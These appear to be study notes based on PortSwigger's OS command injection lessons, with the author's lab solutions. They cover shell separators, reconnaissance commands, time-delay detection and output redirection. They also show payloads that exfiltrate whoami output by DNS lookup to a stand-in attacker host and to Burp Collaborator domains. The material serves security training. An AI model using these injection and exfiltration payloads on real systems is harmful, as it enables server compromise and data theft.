---
description: https://portswigger.net/web-security/os-command-injection
---

# OS Command Injection

## Executing arbitrary commands

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

Consider a shopping application that lets the user view whether an item is in stock in a particular store. This information is accessed via a URL like:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:

`stockreport.pl 381 29`

This command outputs the stock status for the specified item, which is returned to the user.

Since the application implements no defenses against OS command injection, an attacker can submit the following input to execute an arbitrary command:

`& echo aiwefwlguh &`

If this input is submitted in the productID parameter, then the command executed by the application is:

`stockreport.pl & echo aiwefwlguh & 29`

The echo command simply causes the supplied string to be echoed in the output, and is a useful way to test for some types of OS command injection. The & character is a shell command separator, and so what gets executed is actually three separate commands one after another. As a result, the output returned to the user is:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

The three lines of output demonstrate that:

The original stockreport.pl command was executed without its expected arguments, and so returned an error message. The injected echo command was executed, and the supplied string was echoed in the output. The original argument 29 was executed as a command, which caused an error.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### Lab: OS command injection, simple case

POST /product/stock HTTP/1.1

productId=1;$(whoami);\&storeId=1

productId=1\&storeId=1;whoami productId=1\&storeId=1|whoami

When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:

| Purpose of command    | Linux       | Windows       |
| --------------------- | ----------- | ------------- |
| Name of current user  | whoami      | whoami        |
| Operating system      | uname -a    | ver           |
| Network configuration | ifconfig    | ipconfig /all |
| Network connections   | netstat -an | netstat -an   |
| Running processes     | ps -ef      | tasklist      |

## Blind OS command injection vulnerabilities

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The ping command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:

`& ping -c 10 127.0.0.1 &`

This command will cause the application to ping its loopback network adapter for 10 seconds.

### Lab: Blind OS command injection with time delays

It worked only email parameter.

```
POST /feedback/submit HTTP/1.1
csrf=KqGCxTLn47f6h4XIziMxfro6eTJzrthN&name=test&email=a;ping -c 10 127.0.0.1;&subject=test&message=test

email=a;ping -c 10 127.0.0.1;
email=x||ping+-c+10+127.0.0.1|| - Solution at PSA
email=a%0aping -c 10 127.0.0.1%0a
```

### Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:

`& whoami > /var/www/static/whoami.txt &`

The > character sends the output from the whoami command to the specified file. You can then use your browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command.

### Lab: Blind OS command injection with output redirection

```
POST /feedback/submit HTTP/1.1
csrf=1hRg4JRfnpXoq30JXFwJZYb6xRVgMGOT&name=a&email=b;whoami > /var/www/images/whoami.txt;&subject=c&message=d
view-source:https://ac051fcf1e91fd8bc0644ffc00b90005.web-security-academy.net/image?filename=whoami.txt

email=;whoami > /var/www/images/whoami.txt;
email=||whoami>/var/www/images/output.txt|| - Solution at PSA
email=b%0aid > /var/www/images/whoami.txt%0a
email=b%26uname -a > /var/www/images/whoami.txt%26
email=b|ip+addr > /var/www/images/whoami.txt|
```

### Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

`& nslookup kgji2ohoyw.web-attacker.com &`

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

### Lab: Blind OS command injection with out-of-band interaction

```
myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net

POST /feedback/submit
email=a; nslookup myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net;
email=a; nslookup myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net;
email=a%26 nslookup myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net%26
email=a| nslookup myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net|
email=a%0a nslookup myopzbg9zgtjlsk4xfc1xiisajga4z.burpcollaborator.net%0a

email=x||nslookup+x.burpcollaborator.net|| - Solution at PSA
```

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:

`& nslookup whoami.kgji2ohoyw.web-attacker.com &`

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com

### Lab: Blind OS command injection with out-of-band data exfiltration

```
xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net

POST /feedback/submit
email=a; nslookup $(whoami).xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net;
email=a; nslookup `whoami`.xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net;
email=a%26 nslookup $(whoami).xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net%26
email=a| nslookup $(whoami).xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net|
email=a|| nslookup $(whoami).xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net||
email=a%0a nslookup $(whoami).xhi37q95yb4jdwqslq11a7vag1mrag.burpcollaborator.net%0a

email=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net|| - Solution at PSA
```

Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

* &
* &&
* |
* ||

The following command separators work only on Unix-based systems:

* ;
* Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

• `` injected command` `` • $( injected command )

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.
